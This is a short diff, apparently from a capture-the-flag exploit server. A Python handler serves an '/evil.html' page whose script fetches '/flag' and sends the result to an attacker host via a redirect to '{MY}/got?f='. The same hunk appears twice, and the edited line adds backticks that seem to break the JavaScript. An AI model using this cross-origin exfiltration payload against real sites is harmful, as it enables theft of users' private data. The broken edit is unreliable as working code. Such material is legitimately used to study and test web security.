@@ -195,7 +195,7 @@ class Handler(BaseHTTPRequestHandler):
         parsed = urlparse(self.path)
         if parsed.path == '/evil.html':
             payload = f"""<script>
-fetch('/flag').then(r=>r.text()).then(f=>{{
+fetch('/flag').then(r=>r.text()).then(f=>`{{`
   window.location = '{MY}/got?f=' + encodeURIComponent(f)
 }})
 </script>""".encode()
@@ -268,7 +268,7 @@ class Handler(BaseHTTPRequestHandler):
         parsed = urlparse(self.path)
         if parsed.path == '/evil.html':
             payload = f"""<script>
-fetch('/flag').then(r=>r.text()).then(f=>{{
+fetch('/flag').then(r=>r.text()).then(f=>`{{`
   window.location = '{MY}/got?f=' + encodeURIComponent(f)
 }})
 </script>""".encode()
